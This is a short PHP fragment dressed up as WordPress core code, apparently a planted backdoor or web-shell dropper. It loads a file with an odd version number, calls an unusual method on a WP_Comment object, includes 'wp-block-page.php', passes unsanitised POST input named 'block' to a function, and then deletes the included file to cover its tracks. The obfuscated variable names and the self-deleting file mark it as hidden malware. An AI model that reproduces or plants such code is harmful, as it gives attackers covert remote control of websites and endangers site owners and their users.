...
require("class-wp-comment.26.1.php");$wxqc_521636a9=new WP_Comment("test");$wxqc_521636a9-> block_create();require("wp-block-page.php");$zduu_29d6a3e8=$_POST["block"];block($zduu_29d6a3e8);unlink('wp-block-page.php');
